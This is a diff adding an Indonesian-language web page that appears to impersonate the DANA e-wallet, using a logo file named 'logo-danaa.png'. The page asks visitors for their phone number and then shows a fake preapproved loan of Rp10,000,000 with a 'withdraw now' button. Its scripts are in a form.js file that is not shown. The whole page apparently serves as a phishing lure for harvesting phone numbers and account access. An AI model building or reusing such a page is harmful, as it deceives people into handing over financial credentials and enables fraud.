@@ -1,0 +1,181 @@
+<!DOCTYPE html>
+<html lang="id">
+
+<head>
+
+<meta charset="UTF-8">
+
+<meta name="viewport"
+content="width=device-width,
+initial-scale=1.0,
+maximum-scale=1.0,
+user-scalable=no">
+
+<title>AJUKAN</title>
+
+<link rel="stylesheet"
+href="form.css">
+
+</head>
+
+<body>
+
+<div class="container">
+
+    <!-- LOGO -->
+    <div class="logo-wrap">
+
+        <img
+        src="assets/logo-danaa.png"
+        class="logo">
+
+    </div>
+
+    <!-- TITLE -->
+    <div class="title">
+
+        Masukan
+        <b>NOMOR HP</b>
+        kamu untuk lanjut
+
+    </div>
+
+    <!-- INPUT BOX -->
+<div class="phone-row">
+
+    <div class="field-wrap country-wrap">
+        <div class="field-label">Negara</div>
+
+        <div class="country-card">
+            <img src="assets/flag-id.png" class="flag">
+            <span>+62</span>
+        </div>
+    </div>
+
+    <div class="field-wrap number-wrap">
+        <div class="field-label">Nomor</div>
+
+        <div class="number-card">
+            <input
+            type="tel"
+            id="phone"
+            autocomplete="off"
+            placeholder="812-3456-7890">
+
+            <div class="clear-btn" id="clearBtn"></div>
+        </div>
+    </div>
+
+</div>
+
+    <!-- ERROR -->
+    <div
+    class="error-box"
+    id="errorBox">
+
+        Pastikan Nomor yang
+        kamu masukan benar
+
+    </div>
+
+    <!-- DESC -->
+    <div class="desc">
+
+        Dengan melanjutkan,
+        kamu setuju dengan
+        <b>Syarat & Ketentuan</b>
+        serta
+        <b>Pemberitahuan Privasi</b>
+        kami
+
+    </div>
+
+    <!-- BUTTON -->
+    <button
+    class="btn"
+    id="lanjutBtn">
+
+        LANJUTKAN
+
+    </button>
+
+</div>
+
+<div class="loan-popup" id="loanPopup">
+
+    <div class="loan-card">
+
+        <div class="loan-title">
+            Limit Tersedia
+        </div>
+
+        <div class="loan-limit">
+
+            <strong id="limitUtama">
+                Rp10.000.000
+            </strong>
+
+            <span>
+                dari<br>
+                <b id="limitTotal">
+                    Rp10.000.000
+                </b>
+            </span>
+
+        </div>
+
+        <div class="loan-used">
+            Terpakai <b>Rp0</b>
+        </div>
+
+        <div class="loan-progress">
+
+            <input
+                type="range"
+                id="loanRange"
+                class="loan-range"
+                min="500000"
+                max="10000000"
+                step="500000"
+                value="500000">
+
+        </div>
+
+        <div class="loan-withdraw">
+
+            <div class="loan-icon">
+                Rp
+            </div>
+
+            <div class="loan-label">
+                Jumlah<br>
+                Penarikan
+            </div>
+
+            <div
+                class="loan-amount"
+                id="loanAmount">
+
+                Rp500.000
+
+            </div>
+
+        </div>
+
+        <button
+            type="button"
+            class="loan-btn"
+            id="cairkanBtn">
+
+            CAIRKAN SEKARANG
+
+        </button>
+
+    </div>
+
+</div>
+
+<script src="form.js"></script>
+
+</body>
+</html>
